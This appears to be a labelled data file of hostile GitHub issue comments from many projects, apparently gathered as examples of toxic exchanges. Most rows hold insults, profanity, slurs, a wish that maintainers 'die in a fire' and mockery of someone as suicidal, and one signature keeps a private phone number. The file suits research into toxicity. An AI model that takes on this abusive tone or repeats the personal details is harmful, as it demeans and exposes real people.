a chapter on how to skyblock.). I have tried playing other quest packs that did not actually have enough information in the quest lines that you'd have any idea what you were actually trying to do or how to do it. I really do appreciate the large amount of effort (and having tried to make a quest pack once myself, I do mean that I recognize and appreciate the large amount of effort). I have been told by my friends -- both the one who encouraged the rest of us to play this, and the other one that has gone crazy with the musical ceremonies -- that the pack gets much more interesting once I get to the musical ceremonies. I've even discovered that there is a bit of balance issue -- a single person trying to generate enough music by themselves will have trouble on some of the more complicated ceremonies, but 4 people playing music together will find that all of them are trivial. I like the idea of being required to learn mods that I normally do not use -- because there actually is an in game training for these mods, which is usually the point missing from most mods. But if there is no reason to stay around at a given tech level, if the goal that I am learning is ""just advance to the next tech level, and get access to better, more advanced and more powerful mods"", then why? Would I recommend this pack to anybody else? Not based on what I've seen so far. Why am I trying to continue playing this pack? Only because I have 3 friends at tech level 2, and they are waiting for me to catch up so we can play together. And I'm going to ask them to put a standard chest, and a standard crafting table in my room so that I can at least reduce the amount of pain that I have while playing (and I'm going to take advantage of the fact that they already have a horse powered chopping block set up so that I never have to worry about that tap attack issue again). Or, you know, just rely on the fact that I have a water strainer to give me all the planks I need. How does that make any sense anyways? ",True,True
SevTech-Ages/DarkPacks/2977/401582377,SevTech-Ages/DarkPacks/2977,"I deliberately waited a week before replying, because I wanted to make sure that I had a chance to look at this from a point of calmness. Every place that takes bug reports says, break your bug report up. One bug report per issue. Lots of tiny reports. A big report is hard to work with, because no-one wants to start it, because it will take forever to complete. Lots of tiny reports. Were my reports actual ""help, I need support, how do I solve this""? No. They were ""this is broken."". Mipmaps causing problems. Identified in a Forge pull request as mods doing the equivalent of a graphic state push, alteration, and no balancing graphics state pop. A Forge pull request to catch it and fix it by Forge so that you don't need to worry about fixing every single mod that's messing up. Definitely a mod bug, but no clear idea which mod was messing up. Now fixable with a Forge upgrade. (Entirely separate we are warned not to try to upgrade Forge ourself in this pack, because that will break something else). Flint not flaking every single time. Turns out this is apparently expected. Not every attempt to make a flake gets a roll, and you won't always succeed at your attempt. So you have to attempt multiple times, and you're going to have losses. This is not documented, but is expected behavior. A complaint about how items that you pick up off the ground go into your hot bar, and then get dropped as you move your mouse wheel. ""Works as intended"". I'm getting advancements that I haven't earned. ""Eh, we can't fix it"". The hiding of things that you can't detect failing in the case of ore samples. ""Known, but we can't fix it"". Oh, not closed as duplicate, not closed as can't fix, not closed as won't fix, but as ""invalid"". An issue where a new player does not even see the work stump, because of how the advancements are laid out. Along with the comment of ""Okay, now I see it"". Closed without comment. A follow-up report where I say, ""the flint pickaxe trio shows up well before the work stump, even though it cannot be made until after the work stump. This is confusing."". A response of basically, ""we can't do anything about this, this is how the person responsible wants it"". Another report about the Spear and Tomahawk being oddly placed in the achievements, and asking for flaked flint points to be made a tutorial-level item. Closed without comment. Reporting an inconsistency in the way that the spear and tomahawk display information compared to everything else. ""As intended"". 2 different reports about problems making use of just enough items features with work stumps. ""You just don't. You have to deserve it."" A report about getting information on Galactic craft at age 0, instead of something more appropriate (I'm guessing age 4). Closed without comment. A complaint about having to pulse attack to make planks. ""You tap attack on the chopping block..... stop wasting our time with these issues use discord...."". And in this thread, you made it clear that you thought I was asking for support. Not reporting problems. Please take a look at what I have written here tonight. Do you see how a new player, who has never seen this pack before, and is trying to play it through, is going to get very discouraged very quickly? ""That and most of them are Discord issues. This tracker is for bug reports and mod suggestions"" -- WHICH EVERY SINGLE ONE OF THESE IS. Discord is a horrible support tool. Compared to forums, Discord is a horrible support tool. There is effectively no history. There is no way to have any type of ongoing discussion about a topic. There is no way for people to comment on the same topic a day later, and be read and understood by somebody a week later. There is next to no ""pinned topic"" feature like there is in forums. You can pin single messages, but there's no way to respond to them. There is zero expectation that messages posted in Discord will be seen by anybody with the ability to deal with it. High-volume, high noise level, low signal-to-noise value, no organization, and nothing keeping track of what an administrator has/has not yet read, at least nowhere near the degree to which a forum does. ""We're not going to waste our own time when working on the pack and then deal with issues which no effort was put into them or could have been dealt with in Disord."" No effort? No Effort? NO EFFORT? Every single issue that I reported, excluding only the flint flaking, I mentioned how to work around the problem that I found. With flint flaking, there was no workaround because the only problem was the documentation. You complain that I don't put any time into this? I do. You complain that I don't make any effort to solve the problems on my own? I do. More than anything else, it is this dismissal that infuriates me. But none of this is the real problem. Let me restate that. TL; DR none of this is the real problem. ""But to be clear this pack was designed for Sevadus. It's designed around him and how he wanted it. Nothing will change in regards to the advancements or layout. It's done to a spec which we met."" This is the real issue. Do you not see it? Then let me spell it out. Sevadus is the one who has to approve changes. That means any issues with the modpack ultimately need to go to him. Not to you. Trying to report any issue to you is pointless; the only one that matters is somebody who isn't even here, doesn't read these reports, doesn't get reports sent upstream to him from you for his comments, and is completely out of the loop. So why is this issues thing even here? Why do you have an issues section on this GitHub, when ultimately you can't actually do anything? When you just want us to use discord? "" It doesn't help that SevTech starts off by giving you these books when you reach those points for free, and then stops entirely leading the player to believe there IS no book ..."". Well, no apparently, the first person on a server to reach an age where there is a book will get the books for free. Other players don't, and if they aren't aware that the mod has a book, they are clueless. Even worse, imagine seeing a whole bunch of new things show up in your achievements, and not seeing anything at all about backpacks. Absolutely no clue that backpacks have opened up for you. In a modpack that basically triples the number of items that there are to collect. That you need. When your chest/storage space ability has been crippled. ""I'm in age 4 and pausing the game to go spend half an hour googling information that isn't obvious or clear to me in order to progress or acquire something exceedingly valuable is simply par for the course at this point. I've gotten used to it and I never thought about how stupid it was. "". Isn't this basically the point of a quest line? Sorry, an achievement line? I was ready to give up on this completely. My friends basically apologized for rushing through, and rushing ahead so quickly. One of them got to age 3 in a solo world, (during her time off from medical school), and introduced this pack to the rest of us. Another got to age 2 in a solo world in something like 10 days. (As he says, he has no life). The 2 of them worked together with the 3rd person, and they all got at least half way through age 0 during the first week of part-time play while I was still trying to connect my own machine. I tried to progress on my own, trying to catch up with them. By the next weekend? The one with no life had split off from the rest of the group, made his own base, and advanced to age 1. I was struggling with basics. By the end of that weekend, no life was up to age 2, everyone else was up to age 1, we had a teleport network built between our bases, I was trying to make string (and at this point I don't even remember what it was that I needed the string for), and was trying to put down enough torches to safely light up our area, only to realize that instead of one block of wood making 8 sticks making 32 torches, one block of wood might make 6 sticks which makes 2 torches. And a mass of giant trees took more than 3 work blades to de-leaf (because you get more sticks from work blade de-leafing than you do from decay), absolute full of pain and anguish, taking a massive amount of time, and only later do we discover that there's apparently a tool in age 0 that takes the leaves off of a large area of trees in almost no time. If it was just me, I'd already be gone. My friends have convinced me that the pack isn't quite so bad if you have someone to lead you through it, and the other comments in this thread tell me that other people need to be led through it. So the quest line/achievement lines are not sufficient, and the person who made this pack is happy with that. That stinks. I'll probably make videos of my play through and learning, with the goal of being a ""how-to"" for the people who come after me, because this pack badly needs it. ",True,True
Signal-iOS/WhisperSystems/2540/338758265,Signal-iOS/WhisperSystems/2540,"yeah truly i agree with this bug , why the fuck i would c the last digits of my phone number in the debug report ???????? what kind of privacy shit we are talking about ? ",True,True
Terra/ObliqueNET/139/400348618,Terra/ObliqueNET/139,"Okay, I got banned for something I didn't do and the staff didn't take proof pics either. I'd accept the ban if I actually did something to get banned for, other than that, I say no, it's not right to ban someone for something they never did, but okay. ",True,True
Terra/ObliqueNET/139/456904268,Terra/ObliqueNET/139,"Ras, why did I get banned for saying phone numbers in chat when I didn't? Idek any ones irl name, how tf am I supposed to know their number when Idk their irl name and last name? Like bruh, what's wrong with you? ",True,True
TotalFreedomMod/TotalFreedom/2004/392549146,TotalFreedomMod/TotalFreedom/2004,So you're going to act like a child. Rasing a new ticket on #2164 ,True,True
android/cSploit/931/285884059,android/cSploit/931,"The whole app is just a mockup, I've been spending the night reviewing the code and it seems like a donkey (or is it a monkey) wrote that, thanks for an ever failling, condescending app that will never reach the stage of even being in beta. Peace ",True,True
android/cSploit/931/355209488,android/cSploit/931,@friend long as your name indicates that you are 15years old and the csploit you forked has no code from you i cant take you seriously. Fuck off troll ,True,True
asmjit/asmjit/231/400907717,asmjit/asmjit/231,"I do not recommend donating to this project, we have donated a few times to them and now they have removed information about it. Our money wasn't good back then Petr when nobody supported your project? ",True,True
asmjit/asmjit/231/455814689,asmjit/asmjit/231,"I never paid for any advertisement, I thought I did because you said so in the recent emails and it was 9 years ago, but as we all can see you came up with this idea first. If you are so stubborn to NOT include my name on your donors list, even if I supported your project from day one, just because you are angry that I showed you were wrong and donations didn't have any strings attached, it's just another reason to not make any donations to you or any of your projects, because you are dishonest person and you have your supporters for nothing. ",True,True
asmjit/asmjit/231/455813552,asmjit/asmjit/231,"For documentary purposes I'm attaching the whole communication here, because I think it's important for understanding the context. I thought about handling this differently, but I have a weird feeling that it ended like this in all alternative universes. I would also like to say ""sorry"" to the community. In my opinion this issue should have never been opened and the community of open source project should not be used as a jury in a personal dispute between 2 people. My proposal of fixing this is simple. Since I don't have the information to transfer the donated money back (no more PayPal), I would like to donate the same amount in BTC to some other open-source project on behalf of PELock. I thought about x64dbg as they seem to have a good relation with Bartosz and accept crypto. [So here is the communication] I don't think a comment under a commit is a proper way of establishing communication between us about something like this. I don't think making such communication public makes sense as nobody can verify what happened anyway, so what did you try to accomplish? I already calculated it (below) and just wanted to verify the final amount with you. I never said you haven't donated or miscounted the number of donations, so please let's not turn this into something it isn't. I'm not trying to play any card here. I'm trying to make us even in a polite way so we both can move on without a feeling that one owes something to the other. Remember that it was you who started this publicly. So if this stays public then I would like to disclose the amount as i think it's very important considering what you wrote in that issue. So as a result I want to return you what you have invested, because I disagree with your methods and the way you started dealing with it. You have no information about the number of donations that I have received nor their amounts, so please stop these speculations. For your own information - donations are symbolic to me - they are nice and I'm glad when somebody appreciates my work, but it's more about the appreciation than finance to me. I would not be working on asmjit or other open source projects if I wanted to make more money. I love sharing my work and I don't demand anything in return. After all of this I don't want to keep the money and that's what I'm trying to tell you. I don't even insist on sharing any details of the issue publicly if we can just resolve it quickly and quietly without further escalation. For me this is not worth it, it doesn't move the project anywhere, and it distracts me from other work that I wanna do. So please let's do the right thing to finally resolve this so we can move on. [[Reply - PELock]] Hello Petr, Is anything from this list false?  I have donated 3 times without requesting anything in return I have donated one time for the link (2nd donation) Fine, you could remove the link, I agree with that So why do you keep the donations list if I'm not there (just a name)? You don't want the money but you gladly accepted it back then  It just seems you're not very decent and honest person. I have supported many, many reversing and programming projects and this is the first time someone doesn't want to mention the donor just because he has the money now. This is another definition of low level. [[Reply - Petr]] I'm kindly asking you to read again what I have written. I believe the outcome would be different if we started the whole thing differently, but now it's too late to do that, because I just don't like where this went and I don't want to make it worse. I would really appreciate if you send me the IBAN so we can finally resolve this and move on. I'm asking you like third time and you keep only adding more stuff that I'm not interested in. I really don't understand why you make such a drama out of it. We have different opinions and that's it, life goes on, no need to judge others and complicate it. [[Reply - PELock]] Hello Petr, And I don't understand why is it so big problem for you to leave donors names on your page (I'm not asking for the link), does it hurt your feelings or what? Are you ashamed to take donations? If so and you want to be true to yourself you should remove this sections completely, because you don't even know how to handle it properly. I want you to keep the money and think how dishonest your actions are. You deserved donations back then, if I knew how vile person you are I wouldn't donate a cent to you. Please don't write to me again. ",True,True
babel/babel/8432/348466385,babel/babel/8432,SOURCE CODE GENERATED CODE WHAT IS WRONG WITH YOU PEOPLE? DO YOU EVER WRITE DOCUMENTATION FOR YOUR CODE? THIS IS UTTERLY RIDICULOUS. ,True,True
btrfs/maharmstone/88/441363967,btrfs/maharmstone/88,"As I said above... Issue 87 was a harmless use-after-free on shutdown, and nothing to do with this. I've said my piece, and I can see it was a mistake trying to engage with you, so I'm locking this thread. ",True,True
classroom/education/1678/432796979,classroom/education/1678,"I feel I am not the one that has to setup collab with github services to get them to ackowledge problem, from my pov it comes from use of ClassRoom not github.You're all the same company, sort it out, or not and we look for service elsewhere. ",True,True
cordova-plugin-purchase/j3k0/744/432269902,cordova-plugin-purchase/j3k0/744,"Impressive! I searched all your issues and found 2 unresolved closed by inactivity. After a question, the admin decided not to answer but thanks so much it was very useful. If you could link the so called original of my question, please do Make sure you know how to answer before telling ppl to search before ",True,True
courseplay/Courseplay/3219/463041522,courseplay/Courseplay/3219,"I guess I don't like that you have no friggin idea what you are talking about.  For those who know, it was 229322b00717a4c75f8425923ec4ed948e2142b5 causing the issue. ",True,True
courseplay/Courseplay/3234/463821912,courseplay/Courseplay/3234,"This has to be the most unconstructive issue post on here, I have ever seen ( 👎 ",True,True
courseplay/Courseplay/3245/411054856,courseplay/Courseplay/3245,"What an unfriendly and rude forum. I will never post a mistake here again. As I said, unfortunately I can not read Enlisch and thus not scour the forum. ",True,True
diaspora/diaspora/7891/431108382,diaspora/diaspora/7891,"He is and I posted after he told me, postfactum century here we are!! The main reason why Github is the first choice, cause no noob in the forum has a clue about the code these days, got one answer, which repeats what I already wrote, great support! ",True,True
documentation/nextcloud/1142/455118934,documentation/nextcloud/1142,@friend So you did not even try to duplicate the problem before closing the ticket?  I guess that's normal laziness from a doc team that has screenshots from five versions ago. But you didn't test so your doubt don't mean anything. Right.  Anything you can do to avoid your responsibility to have correct docs.  I see how you work. I set this up days ago and I explained how I did it.  I logged on here to help you with your documentation errors.  When you get serious about turning out responsible open source tools please contact me and I will help you debug. ,True,True
electron/electron/17171/469345683,electron/electron/17171,IT IS CONFIRMED THAT THE PROBLEM IS WITH THE PROMISES. I can print to pdf when promise is not used.Please fix it. ,True,True
electron/electron/17171/469347803,electron/electron/17171,PROMISE ALSO WORKS WHEN USED WITHOUT AWAIT..Please Check ,True,True
electron/electron/17171/474130777,electron/electron/17171,You don't care about issue and I wasted my time reporting this issue.I fixed it myself.Thanks for teaching me the rules and the ways not to help....Live in the rules and world of arrogance ,True,True
esx_policejob/ESX-Org/104/399096546,esx_policejob/ESX-Org/104,No I don't write LUA is a useless language... your one to talk about getting mad but you are an example of your own shit player base. You don't offer any assistance to questions you just get pissed when someone asks for help. Maybe you wouldent have these issues if you actually supported your work assisted others in improving it rather then acting like the child you are ,True,True
esx_policejob/ESX-Org/104/399112862,esx_policejob/ESX-Org/104,"you're useless, now fuck off ",True,True
flood/jfurrow/240/277031904,flood/jfurrow/240,OP You can always use a basic auth before accessing the flood login #useless ,True,True
flood/jfurrow/758/457907611,flood/jfurrow/758,"I use docker, yes I build it from master everyday. Honestly my OS and version, etc don't matter as this is clearly not environment specific or version specific and I use docker.... I don't know what you are talking about with discord....I didn't message anyone. It's clear that development is all but dead and getting petty over issue templates when this is clearly an issue with enough info really puts me off. Instead of fixing things, you want to be pedantic over what are simple bugs. I'm done with this project. ",True,True
gobuffalo/gobuffalo/439/414470979,gobuffalo/gobuffalo/439,"So I'm looking at your templating docs and there some notes suggesting Plush isn't required and honestly I never in a million years would consider using it because it isn't designed for humans. How can we switch to Go? By to add a header in plush (from the examples) To do the same in Go templates Please type both of those out more than once and let me know what human would ever choose the former. By the way, Vimeo is blocked in Indonesia. Please consider hosting your own videos. You can use Keybase for this if you need to. ",True,True
gobuffalo/gobuffalo/439/467412051,gobuffalo/gobuffalo/439,"I’m sorry, but this is about one of the rudest tickets I’ve seen. You could’ve just asked asked how to use Go templates, but instead you decided to insult the hard work of a lot of people who do this for FREE. You don’t have to like Plush templates, but you also don’t have to be this rude and insulting. Read  and try to treat people with respect. ",True,True
gobuffalo/gobuffalo/439/467448603,gobuffalo/gobuffalo/439,"I could have, but that wouldn't have been sincere. Those plush templates were an immediate turn off. If the maintainer has 18 years of experience surely they know how to interpret feedback however delivered. ",True,True
grunt/gruntjs/1646/405621328,grunt/gruntjs/1646,"@friend  ""issues are related to grunt ?"" what did  I post about? ""GRUNT"" in LXD Container.  And what do you mean by ""This is not a support channel"" . I never asked you to do my homework. And whatever I said is an Issue as mentioned by @friend , its the problem with concurrent. And fortunately fixed it. Next if ""YOU"" are not familiar, please be quiet and ignore the question. Let some knowledgeable person answer the queries. ",True,True
helm/helm/5439/420124208,helm/helm/5439, Why is helm such trash?  What are some alternatives to helm?   ,True,True
i2cdevlib/jrowberg/252/241722023,i2cdevlib/jrowberg/252,"@friend you certainly have no idea what you are talking about and you surely should delete your reply to this bug report. Read all the thread, I am not using any delay and I know much better than you how important it is to keep the loop fast. ",True,True
i2cdevlib/jrowberg/252/241760891,i2cdevlib/jrowberg/252,"Wow. You're really just an angry brat, aren't you? No wonder no one is trying to help you. You're wrong, but I'm not going to show you why. Learn some etiquette On Tue, Aug 23, 2016, 600 AM batata004 notifications@friend.com wrote --  Thanks, Tyler McGahee (619)-880-7779 San Diego, CA **In an effort to be more responsive to email, my emails have become more brief and less formal. Please excuse any impoliteness; it is not intended. ",True,True
i2cdevlib/jrowberg/252/252907501,i2cdevlib/jrowberg/252,"I gave up, this library is too buggy in many aspects and Jeff Rowberg does not care about solving these MANY bugs that you can find with a simple search at Google. Also Jeff does not even read these threads. IMPORTANT DONT USE JEFF'S LIBRARY FOR ANYTHING IMPORTANT. Sooner or later it will fail and if you are using this library with your quadcopter, robotic arm... STAY AWAY OF IT. You will get hurt and hurt other people. There are serious problems with this library which will, sooner or later, cause you intermitent problems. ",True,True
jobs/TechnologyMasters/144/414838423,jobs/TechnologyMasters/144,"Hi! Looks like you didn't read what I wrote, or didn't understand it. So, I'll piece by piece break down the wall of text there and explain what I'm trying to say. First off, I'm not accusing you of trickery, I'm highlighting your naiveté in hopes that in the future you put more value on the people you're working with. Second off, there is no company. You have no company. You have an idea, and an idea is worthless without execution and followthrough. When you tell someone they'll get 5% in a 11 partnership, that is a miserable deal for what will be weeks (to months, and even years!) of hard work that in a major city earns you a salary and equity in a tco package ALWAYS north of $150k a year. You're not forming a partnership, you're bald-faced trying to fuck them. Take a look at examples of historical and modern startup equity among co-founders.  Jobs convinced Steve Wozniak to take something like 30% ownership in an early Apple. It's widely accepted that Wozniak got capital-f fucked by that. You are not Steve Jobs. By the way, you are absolutely right that's exactly how ""how all the biggest companies in the world run their businesses"". Facebook employs around 25,000 people. How many do you have? Next, there is no ""owner"" of an idea. It's an idea, unless you patent it, in which case you get about 15 years of protection (good luck patenting any variation on a social network, by the way!). There is execution of an idea. You, by yourself, are incapable of executing or else you'd be building it. I made this account as a disposable account. I hope you can appreciate why. Call me a coward, but I don't care to taint my professional reputation. I see listings like this all the time and ignore them (as many other people do), but never as vague and boldly ""I'm an idea guy"" as this. And yes, we have a term for people like you idea guy. It's derisive. ",True,True
ludwig/uber/184/471032466,ludwig/uber/184,"I have read the damn docs! They are obviously not clear enough, at least on my problem. Being Ludwig promoted as easy to implement as it is, I was expecting a little quick help instead of just saying read the docs like a robot. For now I'll wait until Uber hires someone who can respond to my questions properly. ",True,True
mame/mamedev/4469/451357853,mame/mamedev/4469,"Does it make sense to make a report about a version from one year ago? From last weak, from yesterday? NO! Even if I use such old version people will tell to use the latest, if this is not obvious to you it's because you are so damn stupid to figure it out by yourself. Don't be such a dick @friend because the post was already tagged duplicate and closed by me. ",True,True
mame/mamedev/4801/479505881,mame/mamedev/4801,"This is not the real reason your are giving a ban, it's to hide your own incompetence again, and again and we can go on and on, how many times you are gonna close legit reports to dealt with it later? This is what happens when you give a nobody like you some power, they like to show off and oppress other people, to shut people off, you are disgusting and a coward. What you are gonna do now? Delete messages like you did before? It doesn't matter the lame excuse you've gave, it doesn't change the fact that the script it's passing the wrong path to the compiler and #4789 it's breaking MAME memory space . And don't get me wrong, I know how to use a issue tracker, in an organize project, the issue it's acknowledge, tagged and dealt with latter. If you or any other dev will handle it now, tomorrow or 10 years from now, I don't care. It's a damn bug report and not a help request. Why all the drama about it, what are you afraid of? Respect it's a thing we earn, you give respect you shall receive it, if you come towards me in a disrespectful manner I'll shake you off my way and I don't care if you are a fruit cake or a snow flake or whatever generation name you people call yourself this days. Don't expect me to respect a sick, mental ill and suicidal person like @friend that like to attack and persecute people for unknown reason.  is the kind of person you give authority to and allow him to take on other people. ",True,True
mame/mamedev/4801/479455833,mame/mamedev/4801,"@friend between this and #4789 you've shown that you don't seem to have learned anything about how now to use the issue tracker, and how not to get developers off-side.  You're getting a 6-week ban for this. ",True,True
mame/mamedev/4801/479510105,mame/mamedev/4801,"I'll report you too @friend, for all the internet to see how disgusting and abusive you are.♠#mamegate` ",True,True
mapbox-gl-js/mapbox/7158/352352721,mapbox-gl-js/mapbox/7158,Is there a existing plugin for clusters  I can use to ignore fucking styles and whole screen of circles? Leaflet Markercluster is useless!  ,True,True
modmail/kyb3r/49/339655342,modmail/kyb3r/49,"This is a terrible modmail. I don't know how to check the mail, everything is hard to setup. The bot goes offline randomly, the game status always disappear, it doesn't even respond and it is too complicated to setup. Do not ever use this bot to mod mail, trust me. This is terrible and the owner never answers ticket because he did no shit to help and not a great developer. Don't get this, trust me. You will have a hard time and I know how to setup bots. But this crappy bot is terrible. ",True,True
mojo/kraih/1236/404133702,mojo/kraih/1236,"Wow, just ""closed the issue"" as a non-issue? That's mature D ",True,True
msgpack-python/msgpack/305/401723647,msgpack-python/msgpack/305,"&lt;img width=""403"" alt=""2018-07-02 17 57 04"" src="" ""0.4"" is a bug.  It's document for latest version. Because it seems you didn't use your time enough to read code, past issues, etc. Only contributors who can survey themselves can contribute. If I need to teach everything, it's not contribution.  It just bothering me. ",True,True
officer/davidgohel/141/400953258,officer/davidgohel/141,"I asked you to explain ""does not work"". I won't ask a third time, I don't have time for that. ",True,True
openDCIM/samilliken/1114/450206853,openDCIM/samilliken/1114,"group searches is what is broken.                             $ldapSearchDN=str_replace(""%userid%"",$found_dn,html_entity_decode($config-&gt;ParameterArray['LDAPBaseSearch']));  so, no, what your propose does not change the fact it's using CN and not uid. so stop posting stupid answers. ",True,True
openDCIM/samilliken/1114/450223017,openDCIM/samilliken/1114,"By adding in an error log statement at   of something to the effect of error_log($ldapSearchDN); Then again another to show the contents of $config-&gt;ParameterArray['LDAPBaseDN'] we can take those values and throw them into the following search against AD from the values that I have said will work at this point in the code where CN is essentially doing nothing. [wilbur@friend openDCIM]$ ldapsearch -x -b ""DC=ad,DC=wilpig,DC=org"" -D ""tablesb@friend.wilpig.org"" -h 10.0.0.243 -W '(|(userprincipalname=Limited User)(cn=Limited User))' The CN value was pulled from an earlier ldap search so that we are just now matching again against a known value that was pulled from ldap and this time around we are looking for the memberof statements. This is NOT searching for groups based on CN it is actually attempting to just lookup the same object htat we already loaded again because we love to do things repeatedly.  So while you are harping on a CN value it actually does nothing.  that entire section can be removed and have no real issues. Stop quoting me RFC and read the god damned code. ",True,True
openDCIM/samilliken/1114/450224735,openDCIM/samilliken/1114,"I've read the code, I wrote the code, You clearly aren't following the logic and have some bizarre schema in your environment.  I have this code working against a standard AD back end as well as an openldap back end without any issues.  If you are doing pure posix and don't have common names defined, not my problem.  We have common names to help identify groups so we don't have to remember ID numbers.  I'm not changing the code for your self imposed issues. ",True,True
openshot-qt/OpenShot/1619/326970634,openshot-qt/OpenShot/1619,open shot has been great but my most recent video never played when i hit play which made it difficult to cut and edit also when i was done and went to review the video would pause in the same spot every single fucking time it is getting to the point to were i dont wanna use the application any more and when i go to export it would always stop at 32% every single time and it would later say not responding and that was the first time to ever happen in all of my editing and i would open other projects and everything is fine and i know for a fact it is not my video cause i review my videos before i even bother editing so i just dont understand that why now is openshot acting like a piece of shit and not working properly cause i never had this problem before until today ,True,True
openvpn-client/dperson/165/445486679,openvpn-client/dperson/165,"that was rude so you were rude well before me, just saying. and again you are giving me details of your vpn container but you actually not understanding what I'm saying. And as I said, PIA gave you ONE ip and ONLY ONE because of your connection, that doesn't mean that the container which are behind this vpn container are receiving one! Gosh is that so complicated to understand? ",True,True
platform/ngrx/1248/413497951,platform/ngrx/1248,... assholes ,True,True
platform/ngrx/1254/351147160,platform/ngrx/1254,Your software is an undocumented trap to extort money by selling courses and books. You're pieces of shit that need to die in a fire. Go fuck yourselves ,True,True
primitive/haskell/71/353686581,primitive/haskell/71,"I'm less than satisfied with this attitude Do you really think it is a good idea to tell hundreds of project to change their CI? What should people using stack do? Is it really that hard for a relatively small project at the bottom of the food chain to make a new release? It's totally clear that GHC's APIs are not frozen yet, but even if they change before the final release Just make a small fix and release again. Given this resistance, I really have a hard time seeing the value of GHC alpha releases... ",True,True
primitive/haskell/71/353921549,primitive/haskell/71,"@friend, I understand your general point about API instability, but in this particular case it's absurd. The API change that is holding this package down (implementing the  proposal) is one that was formally proposed on the library list and formally accepted and implemented. It is not going to be reversed before the  release. Moreover, even if it were reversed, there is no downside to supplying  instances as required. It is true that the way the  instances were changed in 7e6e7b4667020b61986c60e0c2d642e700e7966d is incompatible with (hypothetically) reverting that change. Making it compatible would be a matter of adding  where required. This issue is annoying everyone; please fix it. ",True,True
primitive/haskell/71/354236722,primitive/haskell/71,"nice tone policing + psych 101 course + insults from cartazio. Now can you let an actual real maintainer (close/wontfix/ignore/resolve) this issue ? I'ld like to know if we can expect to be able to test with non-final GHC 8.4; I personally have tried many time in the past to add non final ghc to my package builds and be stuck with unreleased primitive (or other packages), just like people commenting and watching this issue. ",True,True
pyinstaller/pyinstaller/3160/285257204,pyinstaller/pyinstaller/3160,"I can't believe that the main file of PyInstaller's .exe is not encrypted. My app starts from main.py, then this file import library1.py and library2.py. Using --key and --onefile options PyInstaller encrypts all .pyc files except main.py!!! It is very easy to obtain the source code from .pyc. This is unbelievable... ",True,True
pypi-legacy/pypa/759/287761059,pypi-legacy/pypa/759," probably more trouble than it is worth. For one, it is py2 only, but installs for py3 as well, where it breaks immediately. Then the name ""gi"" usually is used by pygtk and should not be used by a next to worthless breaking package like  this secondary ""fake gi"" installed breaks all gtk apps. This ""fake gi"" should be removed, since it does no longer exist on github as py source. If this ""fake gi"" was deleted, everyone would benefit. ",True,True
react-helmet/nfl/373/447927882,react-helmet/nfl/373,"Remember how it all started in 2015? So much politeness and willingness to serve the community. Naive.  part of the team that open sourced it. I can PR some code, but I wanted to check with you before I started writing code. lmk, thanks. We are using React-Helmet in all of our new react websites, we are also seeking feedback so we can improve on our open source workflow. We plan to release more and the feedback would help tremendously. Three years passed and no one cares anymore. Reminds me of some clumsy accidental male/female relationships. Frontend was blooming that time. Now it's all starting to rot. ",True,True
react-image-lightbox/frontend-collective/99/296077481,react-image-lightbox/frontend-collective/99,position absolute? Are you fucking idiots? ,True,True
react-popper/FezVrasta/111/379498069,react-popper/FezVrasta/111,"So, instead of carrying out a relatively straightforward fix on your side which not only would resolve this issue but also prevent the same issue with the hundreds / thousands of potential package and configuration combinations out there, stopping lots of other developers falling into the same trap - often (as in this case) completely outwith their control, you opt to disown the problem and put it upon every potential consumer of your package to solve instead? I have no direct control over the SharePoint Framework configuration; I'm just a consumer of that set of packages. I have no direct control over how Reactstrap works, I'm just consuming that package, I have no direct control over FontAwesome, again, just a consumer here. I have no direct control over React ... guess what?  Yup, a consumer! I shouldn't even have to care about all of that; especially as I'm not directly consuming react-popper - it's buried deep in a set of dependencies I also have no control over. Surely it's a more 'customer focused' approach to just resolve the problem with the name conflicts than it is to force a mere consumer of packages to play piggy-in-the-middle between multiple projects, all the while wasting time and making no progress on their own projects?  If I gave an answer such as yours in my day job I'd soon not have a day job - so why is it OK for you to do so just because this project is open source?! ",True,True
shlink/shlinkio/210/422346159,shlink/shlinkio/210,"Okay, this form of installation is honestly the worst I have ever experienced. I love the product, really the best link shortner I've ever used but the installation, you really have to fix that, it took me 2 hours in general to even make the installation starting with all preperation without the knowledge of a certified sysadmin. I am very sure that the extreme lack of user experience of your installation process is the man key factor your awesome programm isn't far spread. Now that I got your installation running, it only needed my one single type to f* over the whole installation and letting me redo the whole process after removing it all again. Short I got it working, but please rework your installation process, it is horrible. Great product anyway. Thank you so much. ",True,True
spark/perwendel/1020/393777939,spark/perwendel/1020,"Service http = ignite();  even more foolish! I think you all java programmer should learn some programming theory from UNIX/Linux. Java is a enterprise programming platform, commercial companies like oracle/sun/ibm want to earn more money from customers, so they make java complex and heavy! UNIX/Linux programming theory is the only correct way. ",True,True
termux-packages/termux/2735/413326016,termux-packages/termux/2735,"Pardon my English @friend, what you wrote is bullshit. ",True,True
termux-packages/termux/2735/413358276,termux-packages/termux/2735,"@friend You reacted with a laugh emoji; Is contributing to Termux only to see your contributions deleted (run afoul) really as funny as you stated with your laughing emoji?  Both  and  are down with the latest Termux updates.  This is not funny @friend.  It's a headache for me to keep these projects running while I get, ""broken because it's NOT Termux"" from you and our PhD candidate. ",True,True
webpack-stream/shama/199/410837474,webpack-stream/shama/199,I thought that this first post of yours @friend was stupid.. but that last one just shows how retarded you are ,True,True
windowsserverdocs/MicrosoftDocs/1023/334755524,windowsserverdocs/MicrosoftDocs/1023,"Try to upgrade a GPT/EUFI hardrive to an SSD... Good luck, as MS, and SSD vendors don't even bother to try to offer solutions. Here's a new idea for a rare problem, that makes basic drive upgrades for hundreds of millions a high pain in the butt, while others exploit the OS in disturbing new ways.  Inconvenience consumers who attempt to upgrade storage and there is NO support to facilitate such a basic endeavor. Change for the better is great, but without a path for those who can't afford to throw away everything and but your latest project (which soon will be hyjacked-we know)  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 8cfb6a8b-c7e5-1bf6-0c24-2757871e9d07 Version Independent ID da5ffb60-d0c8-7117-02fe-7a3fd33169ac Content Change a Master Boot Record (MBR) into a GUID partition table (GPT) disk Content Source WindowsServerDocs/storage/disk-management/change-an-mbr-disk-into-a-gpt-disk.md Product windows-server-threshold GitHub Login @friend Microsoft Alias jgerend  ",True,True
